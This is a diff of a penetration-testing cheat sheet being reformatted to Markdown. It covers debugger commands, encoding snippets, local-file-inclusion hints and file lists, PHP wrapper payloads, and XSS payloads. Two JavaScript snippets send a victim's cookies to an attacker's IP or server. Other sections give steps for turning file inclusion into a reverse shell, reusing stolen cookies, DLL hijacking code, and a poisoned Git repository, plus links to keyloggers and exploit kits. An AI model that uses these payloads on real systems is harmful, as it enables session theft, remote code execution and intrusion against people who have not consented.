+### Load Debugging Symbols from a File
 
   ---------------------------------
   symbol-file **\<symbol file\>**
   ---------------------------------
 
-[]{#anchor-380}List Program Source (If available)
+### List Program Source (If available)
 
   --------------------------
   list **\<line number\>**
   --------------------------
 
-[]{#anchor-381}Set Breakpoint
+### Set Breakpoint
 
   ------------------------------------------------------------
   break **\<function name\|line number\|\*memory address\>**
   ------------------------------------------------------------
 
-[]{#anchor-382}Show Breakpoints
+### Show Breakpoints
 
   ------------------
   info breakpoints
   ------------------
 
-[]{#anchor-383}Disable Breakpoint
+### Disable Breakpoint
 
   -----------------------------------
   disable **\<breakpoint number\>**
   -----------------------------------
 
-[]{#anchor-384}Enable Breakpoint
+### Enable Breakpoint
 
   ----------------------------------
   enable **\<breakpoint number\>**
   ----------------------------------
 
-[]{#anchor-385}Delete Breakpoint
+### Delete Breakpoint
 
   ----------------------------------
   delete **\<breakpoint number\>**
   ----------------------------------
 
-[]{#anchor-386}Continue After Hitting Breakpoint
+### Continue After Hitting Breakpoint
 
   ----------
   continue
   ----------
 
-[]{#anchor-387}Step by Instruction
+### Step by Instruction
 
   ----------------------
   stepi **\<number\>**
   ----------------------
 
-[]{#anchor-388}Step by Line
+### Step by Line
 
   ---------------------
   step **\<number\>**
   ---------------------
 
-[]{#anchor-389}Inspect CPU Registers (while running)
+### Inspect CPU Registers (while running)
 
   -------------------
   inspect registers
   -------------------
 
-[]{#anchor-390}Examine Memory Address
+### Examine Memory Address
 
   ------------------------------------------------------
   x/**\<repeat count\>\<format\>\<size\> \<address\>**
   ------------------------------------------------------
 
-[]{#anchor-391}Print Variable Information
+### Print Variable Information
 
   -----------------------------
   print **\<variable name\>**
   -----------------------------
 
-[]{#anchor-392}Disassemble Function
+### Disassemble Function
 
   -----------------------------------
   disassemble **\<function name\>**
   -----------------------------------
 
-[]{#anchor-393}Change Memory Values of Running Program
+### Change Memory Values of Running Program
 
   --------------------------------------------------------------------
   set {**\<data type\>**} **\<memory address\>** = **\<new value\>**
   --------------------------------------------------------------------
 
-[]{#anchor-394}Addressing a Specific Byte In Memory Address
+### Addressing a Specific Byte In Memory Address
 
   --------------------------------------------
   (**\<memory address\>** + **\<integer\>**)
   --------------------------------------------
 
-[]{#anchor-395}Set Convenience Variable
+### Set Convenience Variable
 
   ---------------------------------------------
   set \$**\<variable name\>** = **\<value\>**
   ---------------------------------------------
 
-[]{#anchor-396}Call a Function (Any function within the scope of the
-program)
+### Call a Function (Any function within the scope of the program)
 
   ------------------------------------------
   call \<**function\>**(**\<arguments\>**)
   ------------------------------------------
 
-[]{#anchor-397}Change Disassembly Flavor to Intel
+### Change Disassembly Flavor to Intel
 
   ------------------------------
   set disassembly-flavor intel
   ------------------------------
 
-[]{#anchor-398}Immunity Debugger
+Immunity Debugger
+=================
 
-[]{#anchor-399}Ignore Access Violations (Useful when debugging shellcode
-with System calls)
+Ignore Access Violations (Useful when debugging shellcode with System calls)
+----------------------------------------------------------------------------
 
-  --
-  --
++-----------------------------------------------------+
+| 1.  Click **Debugging Options**.                    |
+|                                                     |
+| 2.  Click the **Exceptions** tab.                   |
+|                                                     |
+| 3.  Add the following ranges:                       |
+|                                                     |
+|     a.  0xC0000005 - ACCESS VIOLATION               |
+|                                                     |
+|     b.  0x80000001 - STATUS\_GUARD\_PAGE\_VIOLATION |
++-----------------------------------------------------+
 
-[]{#anchor-400}Encoding & Decoding
+Encoding & Decoding
+===================
 
-[]{#anchor-401}Base64
+Base64
+------
 
-[]{#anchor-402}PowerShell
+### PowerShell
 
-[]{#anchor-403}Encode a String
+#### Encode a String
 
 +--------------------------------------------------------------+
 | \$Text = '**\<TEXT\>**'                                      |
@@ -3052,7 +3169,7 @@ with System calls)
 | \$EncodedText =\[Convert\]::ToBase64String(\$Bytes)          |
 +--------------------------------------------------------------+
 
-[]{#anchor-404}Decode Base64 Encoded String
+#### Decode Base64 Encoded String
 
 +-----------------------------------------------------------------------+
 | \$EncodedText = "**\<Base64\_String\>**"                              |
@@ -3062,7 +3179,7 @@ with System calls)
 | ase64String(\$EncodedText))                                           |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-405}Encode a Byte Array
+#### Encode a Byte Array
 
 +--------------------------------------------------+
 | \$bytes = \[Byte\[\]\] ( **\<Byte\_Array\>** )   |
@@ -3070,7 +3187,7 @@ with System calls)
 | \$Encoded = \[Convert\]::ToBase64String(\$bytes) |
 +--------------------------------------------------+
 
-[]{#anchor-406}Decode a Base64 Encoded Byte Array
+#### Decode a Base64 Encoded Byte Array
 
 +----------------------------------------------------+
 | \$Encoded = "\<Base64\_String\>"                   |
@@ -3078,9 +3195,9 @@ with System calls)
 | \$Bytes = \[Convert\]::FromBase64String(\$Encoded) |
 +----------------------------------------------------+
 
-[]{#anchor-407}Python
+### Python
 
-[]{#anchor-408}Encode a String
+#### Encode a String
 
 +------------------------------------+
 | import Base64                      |
@@ -3088,7 +3205,7 @@ with System calls)
 | Base64.b64Encode(**\'\<TEXT\>**\') |
 +------------------------------------+
 
-[]{#anchor-409}Decode Base64 Encoded String
+#### Decode Base64 Encoded String
 
 +----------------------------------------------+
 | import Base64                                |
@@ -3096,41 +3213,42 @@ with System calls)
 | Base64.b64Decode(\'**\<Base64\_String\>**\') |
 +----------------------------------------------+
 
-[]{#anchor-410}JavaScript
+### JavaScript
 
-[]{#anchor-411}Encode a String
+#### Encode a String
 
   ------------------------
   btoa(\'**\<TEXT\>**\')
   ------------------------
 
-[]{#anchor-412}Decode Base64 Encoded String
+#### Decode Base64 Encoded String
 
   ----------------------------------
   atob(\'**\<Base64\_String\>**\')
   ----------------------------------
 
-[]{#anchor-413}Escaped/Unescaped Unicode
+Escaped/Unescaped Unicode
+-------------------------
 
-[]{#anchor-414}Javascript
+### Javascript
 
-[]{#anchor-415}Encode a String
+#### Encode a String
 
 +-----------------------------------------------------------------------+
 | String.prototype.toUnicode = function(){                              |
 |                                                                       |
-| var result = \"\";                                                    |
-|                                                                       |
-| for(var i = 0; i \< this.length; i++){                                |
-|                                                                       |
+| > var result = \"\";                                                  |
+| >                                                                     |
+| > for(var i = 0; i \< this.length; i++){                              |
+| >                                                                     |
 | > // Assumption: all characters are \< 0xffff                         |
-|                                                                       |
+| >                                                                     |
 | > result += \"\\\\u\" + (\"000\" +                                    |
 | > this\[i\].charCodeAt(0).toString(16)).substr(-4);                   |
-|                                                                       |
-| }                                                                     |
-|                                                                       |
-| return result;                                                        |
+| >                                                                     |
+| > }                                                                   |
+| >                                                                     |
+| > return result;                                                      |
 |                                                                       |
 | };                                                                    |
 |                                                                       |
@@ -3144,15 +3262,16 @@ with System calls)
 | \"Green\".toUniCode(); //\"\\u0047\\u0072\\u0065\\u0065\\u006e\"      |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-416}Escaped/Unescaped Hex
+Escaped/Unescaped Hex
+---------------------
 
-[]{#anchor-417}Binary File to Escaped Hex String (Linux)
+### Binary File to Escaped Hex String (Linux)
 
   -------------------------------------------------------------------------------------------------------------------------
   od -tx1 **\<file\_name\>** \| sed -e \'s/\^\[0-9\]\* //\' -e \'\$d\' -e \'s/\^/ /\' -e \'s/ /\\\\x/g\' \| tr -d \'\\n\'
   -------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-418}Escaped Hex to Binary File (PowerShell)
+### Escaped Hex to Binary File (PowerShell)
 
 +-----------------------------------------------------------------------+
 | \# Create an empty zero length Byte\[\] array                         |
@@ -3190,7 +3309,8 @@ with System calls)
 | \[io.file\]::WriteAllBytes(\'output.bin\',\$decodedBytes)             |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-419}Python Escape Bytes
+Python Escape Bytes
+-------------------
 
 +--------------------------------------------------------------------------+
 | s = \'**\<bytes\>**\'                                                    |
@@ -3198,9 +3318,10 @@ with System calls)
 | sx = r\"\\x\" + r\"\\x\".join(s\[n : n+2\] for n in range(0, len(s), 2)) |
 +--------------------------------------------------------------------------+
 
-[]{#anchor-420}URL Encoding
+URL Encoding
+------------
 
-[]{#anchor-421}Python 2.x.x
+### Python 2.x.x
 
 +-----------------------------------------------------------------+
 | import urllib                                                   |
@@ -3208,7 +3329,7 @@ with System calls)
 | urlEncoded = urllib.quote\_plus(\"**\<string\_to\_encode\>**\") |
 +-----------------------------------------------------------------+
 
-[]{#anchor-422}Python 3.x.x
+### Python 3.x.x
 
 +-----------------------------------------------------------------------+
 | import urllib.parse                                                   |
@@ -3216,9 +3337,11 @@ with System calls)
 | urlEncoded = urllib.parse.quote\_plus(\"**\<string\_to\_encode\>**\") |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-423}Local File Include (LFI)
+Local File Include (LFI)
+========================
 
-[]{#anchor-424}General Hints
+General Hints
+-------------
 
 Look for useful files such as:
 
@@ -3248,6 +3371,7 @@ Look for useful files such as:
         > include the log file to gain execution.
 
         -   Reverse Shell via shell\_exec()
+
         -   Add a web-shell that executes supplied commands
 
 -   Emails
@@ -3264,7 +3388,8 @@ Look for useful files such as:
         > command can be complex if this works. I.e. full Python reverse
         > shell, etc.)
 
-[]{#anchor-425}Null Terminators
+Null Terminators
+----------------
 
 +--------+
 | \%00   |
@@ -3272,7 +3397,8 @@ Look for useful files such as:
 | \%2500 |
 +--------+
 
-[]{#anchor-426}Interesting Files (Linux)
+Interesting Files (Linux)
+-------------------------
 
 +------------------------------------------+
 | /etc/issue                               |
@@ -3820,7 +3946,8 @@ Look for useful files such as:
 | \~/.xsession                             |
 +------------------------------------------+
 
-[]{#anchor-427}Running Process Information (Linux)
+Running Process Information (Linux)
+-----------------------------------
 
 +--------------------------+
 | /proc/\<int\>/fd/\<int\> |
@@ -3830,7 +3957,8 @@ Look for useful files such as:
 | /proc/2116/fd/11         |
 +--------------------------+
 
-[]{#anchor-428}Interesting Files (Windows)
+Interesting Files (Windows)
+---------------------------
 
 +--------------------------------------------------------------+
 | \%SYSTEMROOT%repairsystem                                    |
@@ -3984,7 +4112,8 @@ Look for useful files such as:
 | C:/inetpub/logs/LogFiles/W3SVC1/u\_ex\[YYMMDD\].log          |
 +--------------------------------------------------------------+
 
-[]{#anchor-429}Interesting Files (OSX)
+Interesting Files (OSX)
+-----------------------
 
 +--------------------+
 | /etc/fstab         |
@@ -3998,7 +4127,8 @@ Look for useful files such as:
 | /etc/sysctl.conf   |
 +--------------------+
 
-[]{#anchor-430}Reading PHP/Binary File Contents
+Reading PHP/Binary File Contents
+--------------------------------
 
 Including a file in the following format will return the contents in
 Base64 encoding (May be useful for reading binary data)
@@ -4007,9 +4137,10 @@ Base64 encoding (May be useful for reading binary data)
   php://filter/read=convert.base64-encode/resource=**\<file\_to\_read\>**
   -------------------------------------------------------------------------
 
-[]{#anchor-431}PHP Wrappers
+PHP Wrappers
+------------
 
-[]{#anchor-432}PHP Expect Wrapper (Not default)
+### PHP Expect Wrapper (Not default)
 
 Could result in code execution.
 
@@ -4017,49 +4148,64 @@ Could result in code execution.
   php?page=expect://ls
   ----------------------
 
-[]{#anchor-433}PHP Input Wrapper
+### PHP Input Wrapper
 
   --------------------------
   ?page=php://input&cmd=ls
   --------------------------
 
-[]{#anchor-434}PHP Zip Wrapper
+### PHP Zip Wrapper
 
-  --
-  --
++-----------------------------------------------------------------------+
+| 1.  Create a PHP reverse shell                                        |
+|                                                                       |
+| 2.  Compress to a .zip file                                           |
+|                                                                       |
+| 3.  Upload the compressed shell payload to the server                 |
+|                                                                       |
+| 4.  Use the zip wrapper to extract the payload using:                 |
+|     > php?page=zip://path/to/file.zip%23shell                         |
+|                                                                       |
+| 5.  The above will extract the zip file to shell, if the server does  |
+|     > not append .php rename it to shell.php instead                  |
++-----------------------------------------------------------------------+
 
-[]{#anchor-435}XSS
+XSS
+===
 
-[]{#anchor-436}SVG Tag
+SVG Tag
+-------
 
   -----------------------------------------------------------------------------------------------------
   \<svg/onload=location=window\[\`atob\`\]\`amF2YXNjcmlwdDphbGVydCgxKQ==\`;// https://t.co/pwtrIsYUTt
   -----------------------------------------------------------------------------------------------------
 
-[]{#anchor-437}Send Cookie & URL via JavaScript HTTP Request (All
-Browsers)
+Send Cookie & URL via JavaScript HTTP Request (All Browsers)
+------------------------------------------------------------
 
   ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
   function a(t){window.XMLHttpRequest?b=new XMLHttpRequest:b=new ActiveXObject(\"Microsoft.XMLHTTP\"),b.onreadystatechange=function(){4==b.readyState&&200==b.status&&alert(b.responseText)},b.open(\"GET\",t,!1),b.send()}a(\"http:/**/\<ip\_address\>**:**\<port\>**/somefile.php?cookie=\"+document.cookie+\"&location=\"+document.location);
   ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-438}Send Cookie in IMG Request via Added Element
+Send Cookie in IMG Request via Added Element
+--------------------------------------------
 
-+------------------------------------------------------+
-| function addIMG() {                                  |
-|                                                      |
-| var img = document.createElement(\'img\');           |
-|                                                      |
-| img.src = \'**\<server\_URL\>**\' + document.cookie; |
-|                                                      |
-| document.body.appendChild(img);                      |
-|                                                      |
-| }                                                    |
-|                                                      |
-| addIMG();                                            |
-+------------------------------------------------------+
++--------------------------------------------------------+
+| function addIMG() {                                    |
+|                                                        |
+| > var img = document.createElement(\'img\');           |
+| >                                                      |
+| > img.src = \'**\<server\_URL\>**\' + document.cookie; |
+| >                                                      |
+| > document.body.appendChild(img);                      |
+|                                                        |
+| }                                                      |
+|                                                        |
+| addIMG();                                              |
++--------------------------------------------------------+
 
-[]{#anchor-439}Using Stolen Cookies
+Using Stolen Cookies
+====================
 
 From the inspection console.
 
@@ -4067,15 +4213,18 @@ From the inspection console.
   document.cookie=\"**\<cookie\>**\";
   -------------------------------------
 
-[]{#anchor-440}COM Objects
+COM Objects
+===========
 
-[]{#anchor-441}List All Available COM Objects
+List All Available COM Objects
+------------------------------
 
   -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
   Get-ChildItem HKLM:\\Software\\Classes -ErrorAction SilentlyContinue \| Where-Object { \$\_.PSChildName -match \'\^\\w+\\.\\w+\$\' -and (Test-Path -Path \"\$(\$\_.PSPath)\\CLSID\") } \| Select-Object -ExpandProperty PSChildName
   -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-[]{#anchor-442}Creating PowerShell COM Objects by CLSID
+Creating PowerShell COM Objects by CLSID
+----------------------------------------
 
   -------------------------------------------------------------------------------
   \$type= \[Type\]::GetTypeFromCLSID(\'13709620-C279-11CE-A49E-444553540000\')\
@@ -4083,11 +4232,13 @@ From the inspection console.
 
   -------------------------------------------------------------------------------
 
-[]{#anchor-443}Vulnerabilities/Exploits
+Vulnerabilities/Exploits
+========================
 
-[]{#anchor-444}DLL Hijacking
+DLL Hijacking
+-------------
 
-[]{#anchor-445}C++ Function Export Example
+### C++ Function Export Example
 
 The following code will export a single function called
 **VolumeDismount**.
@@ -4111,7 +4262,7 @@ The following code will export a single function called
 | }                                                                     |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-446}C++ EntryPoints & Exports
+### C++ EntryPoints & Exports
 
 This example will run a command when the process attaches, it will also
 pop **calc.exe** when one of the exported functions is called.
@@ -4179,33 +4330,36 @@ pop **calc.exe** when one of the exported functions is called.
 | }                                                                     |
 +-----------------------------------------------------------------------+
 
-[]{#anchor-447}CVE Repositories
+CVE Repositories
+----------------
 
-[*https://nvd.nist.gov/*](https://nvd.nist.gov/)
+[[https://nvd.nist.gov/]{.underline}](https://nvd.nist.gov/)
 
-[*http://cve.mitre.org/index.html*](http://cve.mitre.org/index.html)
+[[http://cve.mitre.org/index.html]{.underline}](http://cve.mitre.org/index.html)
 
-[*http://www.cvedetails.com/*](http://www.cvedetails.com/)
+[[http://www.cvedetails.com/]{.underline}](http://www.cvedetails.com/)
 
-[*https://www.scaprepo.com/*](https://www.scaprepo.com/)
+[[https://www.scaprepo.com/]{.underline}](https://www.scaprepo.com/)
 
-[*http://secpod.com/*](http://secpod.com/)
+[[http://secpod.com/]{.underline}](http://secpod.com/)
 
-[*http://osvdb.org/*](http://osvdb.org/)
+[[http://osvdb.org/]{.underline}](http://osvdb.org/)
 
-[*http://www.exploit-db.com/*](http://www.exploit-db.com/)
+[[http://www.exploit-db.com/]{.underline}](http://www.exploit-db.com/)
 
-[*https://github.com/athiasjerome/XORCISM*](https://github.com/athiasjerome/XORCISM)
+[[https://github.com/athiasjerome/XORCISM]{.underline}](https://github.com/athiasjerome/XORCISM)
 
-[]{#anchor-448}Bug Repositories
+Bug Repositories
+----------------
 
-[]{#anchor-449}Git
+Git
+---
 
-[]{#anchor-450}CVE-2014-9390
+### CVE-2014-9390
 
-[*https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial*](https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial)
+[[https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial]{.underline}](https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial)
 
-[*https://github.com/rapid7/metasploit-framework/issues/4435*](https://github.com/rapid7/metasploit-framework/issues/4435)
+[[https://github.com/rapid7/metasploit-framework/issues/4435]{.underline}](https://github.com/rapid7/metasploit-framework/issues/4435)
 
 This exploit relies on the machine running Git to be using a file system
 that ignores case (i.e. Windows, OS X)
@@ -4230,216 +4384,238 @@ Once this poisoned Git repository is cloned the command in the
 post-checkout will be run on the machine that it is being cloned to. The
 command will run with the rights of the user running Git.
 
-[]{#anchor-451}Default Password Links
+Default Password Links
+======================
 
-[*http://www.cirt.net/passwords*](http://www.cirt.net/passwords)
+[[http://www.cirt.net/passwords]{.underline}](http://www.cirt.net/passwords)
 
-[*http://www.virus.org/default-passwords/*](http://www.virus.org/default-passwords/)
+[[http://www.virus.org/default-passwords/]{.underline}](http://www.virus.org/default-passwords/)
 
-[*http://www.routerpasswords.com/*](http://www.routerpasswords.com/)
+[[http://www.routerpasswords.com/]{.underline}](http://www.routerpasswords.com/)
 
-[*https://www.security-database.com/dbe.php*](https://www.security-database.com/dbe.php)
+[[https://www.security-database.com/dbe.php]{.underline}](https://www.security-database.com/dbe.php)
 
-[]{#anchor-452}Useful Links
+Useful Links
+============
 
-[]{#anchor-453}GitHub Links
+GitHub Links
+------------
 
-[]{#anchor-454}ETW Keylogger POC
+### ETW Keylogger POC
 
--   [*https://github.com/CyberPoint/Ruxcon2016ETW/tree/master/KeyloggerPOC*](https://github.com/CyberPoint/Ruxcon2016ETW/tree/master/KeyloggerPOC)
+-   [[https://github.com/CyberPoint/Ruxcon2016ETW/tree/master/KeyloggerPOC]{.underline}](https://github.com/CyberPoint/Ruxcon2016ETW/tree/master/KeyloggerPOC)
 
-[]{#anchor-455}SubTee (Casey Smith) C\# Keylogger
+### SubTee (Casey Smith) C\# Keylogger
 
--   [*https://gist.github.com/subTee/c51ea995dfaf919fd4bd36b3f7252486*](https://gist.github.com/subTee/c51ea995dfaf919fd4bd36b3f7252486)
--   [*https://gist.github.com/subTee/d32a4912b2798197663e883ea6a68937*](https://gist.github.com/subTee/d32a4912b2798197663e883ea6a68937)
+-   [[https://gist.github.com/subTee/c51ea995dfaf919fd4bd36b3f7252486]{.underline}](https://gist.github.com/subTee/c51ea995dfaf919fd4bd36b3f7252486)
 
-[]{#anchor-456}HackSysTeam Extreme Vulnerability Driver (HEVD)
+-   [[https://gist.github.com/subTee/d32a4912b2798197663e883ea6a68937]{.underline}](https://gist.github.com/subTee/d32a4912b2798197663e883ea6a68937)
 
--   [*https://github.com/GradiusX/HEVD-Python-Solutions*](https://github.com/GradiusX/HEVD-Python-Solutions)
+### HackSysTeam Extreme Vulnerability Driver (HEVD)
 
-[]{#anchor-457}DLLInjector
+-   [[https://github.com/GradiusX/HEVD-Python-Solutions]{.underline}](https://github.com/GradiusX/HEVD-Python-Solutions)
 
--   [*https://github.com/OpenSecurityResearch/dllinjector*](https://github.com/OpenSecurityResearch/dllinjector)
+### DLLInjector
 
-[]{#anchor-458}PowerShell Tools
+-   [[https://github.com/OpenSecurityResearch/dllinjector]{.underline}](https://github.com/OpenSecurityResearch/dllinjector)
 
-[]{#anchor-459}Empire
+PowerShell Tools
+----------------
 
--   [*https://github.com/PowerShellEmpire/Empire*](https://github.com/PowerShellEmpire/Empire)
+### Empire
 
-[]{#anchor-460}PowerSploit
+-   [https://github.com/PowerShellEmpire/Empire]{.underline}
 
--   [*https://github.com/PowerShellMafia/PowerSploit*](https://github.com/PowerShellMafia/PowerSploit)
+### PowerSploit
 
-[]{#anchor-461}Nishang
+-   [[https://github.com/PowerShellMafia/PowerSploit]{.underline}](https://github.com/PowerShellMafia/PowerSploit)
 
--   [*https://github.com/samratashok/nishang*](https://github.com/samratashok/nishang)
+### Nishang
 
-[]{#anchor-462}PowerUpSQL
+-   [https://github.com/samratashok/nishang]{.underline}
 
--   [*https://github.com/NetSPI/PowerUpSQL*](https://github.com/NetSPI/PowerUpSQL)
+### PowerUpSQL
 
-[]{#anchor-463}P0wnedShell
+-   [https://github.com/NetSPI/PowerUpSQL]{.underline}
 
--   [*https://github.com/Cn33liz/p0wnedShell*](https://github.com/Cn33liz/p0wnedShell)
+### P0wnedShell
 
-[]{#anchor-464}Awesomershell
+-   [https://github.com/Cn33liz/p0wnedShell]{.underline}
 
--   [*https://github.com/Ben0xA/AwesomerShell*](https://github.com/Ben0xA/AwesomerShell)
+### Awesomershell
 
-[]{#anchor-465}Not PowerShell (nps)
+-   [https://github.com/Ben0xA/AwesomerShell]{.underline}
 
--   [*https://github.com/Ben0xA/nps*](https://github.com/Ben0xA/nps)
+### Not PowerShell (nps)
 
-[]{#anchor-466}Other Things
+-   [https://github.com/Ben0xA/nps]{.underline}
 
-[]{#anchor-467}PyKEK (Python Kerberos Exploitation Kit)
+Other Things
+------------
 
--   [*https://github.com/bidord/pykek*](https://github.com/bidord/pykek)
+### PyKEK (Python Kerberos Exploitation Kit)
 
-[]{#anchor-468}Misc Scripts
+-   [[https://github.com/bidord/pykek]{.underline}](https://github.com/bidord/pykek)
 
--   [*http://thesprawl.org/research/writing-nse-scripts-for-vulnerability-scanning/*](http://thesprawl.org/research/writing-nse-scripts-for-vulnerability-scanning/)
--   [*http://www.scip.ch/?labs.20130625*](http://www.scip.ch/?labs.20130625)
--   [*https://www.powershellgallery.com/packages/Save-ScreenCapture/1.0.0.0/DisplayScript*](https://www.powershellgallery.com/packages/Save-ScreenCapture/1.0.0.0/DisplayScript)
--   [*https://www.powershellgallery.com/packages/Test-IsVirtual/1.0.0.0/DisplayScript*](https://www.powershellgallery.com/packages/Test-IsVirtual/1.0.0.0/DisplayScript)
+### Misc Scripts
 
-[]{#anchor-469}Kyle's Notes
+-   [[http://thesprawl.org/research/writing-nse-scripts-for-vulnerability-scanning/]{.underline}](http://thesprawl.org/research/writing-nse-scripts-for-vulnerability-scanning/)
 
--   [*https://www.evernote.com/pub/kbisdorf/adsim*](https://www.evernote.com/pub/kbisdorf/adsim)
+-   [[http://www.scip.ch/?labs.20130625]{.underline}](http://www.scip.ch/?labs.20130625)
 
-[]{#anchor-470}Google Hacking Links
+-   [[https://www.powershellgallery.com/packages/Save-ScreenCapture/1.0.0.0/DisplayScript]{.underline}](https://www.powershellgallery.com/packages/Save-ScreenCapture/1.0.0.0/DisplayScript)
 
--   [*https://www.exploit-db.com/google-hacking-database/*](https://www.exploit-db.com/google-hacking-database/)
+-   [[https://www.powershellgallery.com/packages/Test-IsVirtual/1.0.0.0/DisplayScript]{.underline}](https://www.powershellgallery.com/packages/Test-IsVirtual/1.0.0.0/DisplayScript)
 
-[]{#anchor-471}Hot Potato (Privilege Escalation)
+### Kyle's Notes
 
--   [*https://github.com/foxglovesec/Potato*](https://github.com/foxglovesec/Potato)
+-   [[https://www.evernote.com/pub/kbisdorf/adsim]{.underline}](https://www.evernote.com/pub/kbisdorf/adsim)
 
-[]{#anchor-472}Raspberry PI as a USB Device
+### Google Hacking Links
 
--   [*http://isticktoit.net/?p=1383*](http://isticktoit.net/?p=1383)
--   [*https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget?view=all*](https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget?view=all)
--   [*https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget/ethernet-gadget*](https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget/ethernet-gadget)
+-   [[https://www.exploit-db.com/google-hacking-database/]{.underline}](https://www.exploit-db.com/google-hacking-database/)
 
-[]{#anchor-473}PoisonTap (Raspberry PI USB Ethernet Device)
+### Hot Potato (Privilege Escalation)
 
--   [*https://github.com/samyk/poisontap*](https://github.com/samyk/poisontap)
+-   [[https://github.com/foxglovesec/Potato]{.underline}](https://github.com/foxglovesec/Potato)
 
-[]{#anchor-474}USB Ethernet Device Driver Example
+### Raspberry PI as a USB Device
 
--   [*https://github.com/ev3dev/ev3-systemd/blob/ev3dev-jessie/scripts/ev3-usb.sh*](https://github.com/ev3dev/ev3-systemd/blob/ev3dev-jessie/scripts/ev3-usb.sh)
+-   [[http://isticktoit.net/?p=1383]{.underline}](http://isticktoit.net/?p=1383)
 
-[]{#anchor-475}Responder
+-   [[https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget?view=all]{.underline}](https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget?view=all)
 
--   [*https://github.com/lgandx/Responder.git*](https://github.com/lgandx/Responder.git)
+-   [[https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget/ethernet-gadget]{.underline}](https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget/ethernet-gadget)
 
-[]{#anchor-476}Pi USB Ethernet
+### PoisonTap (Raspberry PI USB Ethernet Device)
 
--   [*https://hackaday.io/project/10387-gadget/log/34463-on-windows-drivers-and-usb-gadgets*](https://hackaday.io/project/10387-gadget/log/34463-on-windows-drivers-and-usb-gadgets)
--   [*http://isticktoit.net/?p=1383*](http://isticktoit.net/?p=1383)
--   [*https://www.kernel.org/doc/Documentation/usb/gadget\_configfs.txt*](https://www.kernel.org/doc/Documentation/usb/gadget_configfs.txt)
--   [*https://groups.google.com/forum/m/\#!msg/beaglebone/IKV0g14oYRQ/8Z\_vEv\_fAwAJ*](https://groups.google.com/forum/m/#!msg/beaglebone/IKV0g14oYRQ/8Z_vEv_fAwAJ)
+-   [[https://github.com/samyk/poisontap]{.underline}](https://github.com/samyk/poisontap)
 
-[]{#anchor-477}Manually Interacting w/HTTP
+### USB Ethernet Device Driver Example
 
--   [*http://www.the-art-of-web.com/system/telnet-http11/*](http://www.the-art-of-web.com/system/telnet-http11/)
+-   [[https://github.com/ev3dev/ev3-systemd/blob/ev3dev-jessie/scripts/ev3-usb.sh]{.underline}](https://github.com/ev3dev/ev3-systemd/blob/ev3dev-jessie/scripts/ev3-usb.sh)
 
-[]{#anchor-478}Fingerprinting IIS
+### Responder
 
--   [*https://blogs.msdn.microsoft.com/vijaysk/2010/09/01/fingerprinting-iis/*](https://blogs.msdn.microsoft.com/vijaysk/2010/09/01/fingerprinting-iis/)
+-   [[https://github.com/lgandx/Responder.git]{.underline}](https://github.com/lgandx/Responder.git)
 
-[]{#anchor-479}Old AccessChk.exe
+### Pi USB Ethernet 
 
--   [*https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe*](https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe)
+-   [[https://hackaday.io/project/10387-gadget/log/34463-on-windows-drivers-and-usb-gadgets]{.underline}](https://hackaday.io/project/10387-gadget/log/34463-on-windows-drivers-and-usb-gadgets)
 
-[]{#anchor-480}DLL Injection
+-   [[http://isticktoit.net/?p=1383]{.underline}](http://isticktoit.net/?p=1383)
 
--   [*http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html?m=1*](http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html?m=1)
+-   [[https://www.kernel.org/doc/Documentation/usb/gadget\_configfs.txt]{.underline}](https://www.kernel.org/doc/Documentation/usb/gadget_configfs.txt)
 
-[]{#anchor-481}MS14-068 (Pass-the-Credential Cache)
+-   [[https://groups.google.com/forum/m/\#!msg/beaglebone/IKV0g14oYRQ/8Z\_vEv\_fAwAJ]{.underline}](https://groups.google.com/forum/m/#!msg/beaglebone/IKV0g14oYRQ/8Z_vEv_fAwAJ)
 
--   [*https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/*](https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/)
--   [*https://www.trustedsec.com/december-2014/ms14-068-full-compromise-step-step/*](https://www.trustedsec.com/december-2014/ms14-068-full-compromise-step-step/)
+### Manually Interacting w/HTTP
 
-[]{#anchor-482}Dumping Credentials
+-   [[http://www.the-art-of-web.com/system/telnet-http11/]{.underline}](http://www.the-art-of-web.com/system/telnet-http11/)
 
--   [*https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/*](https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/)
+### Fingerprinting IIS
 
-[]{#anchor-483}IIS 6.0 Exploit (CVE-2017-7269)
+-   [[https://blogs.msdn.microsoft.com/vijaysk/2010/09/01/fingerprinting-iis/]{.underline}](https://blogs.msdn.microsoft.com/vijaysk/2010/09/01/fingerprinting-iis/)
 
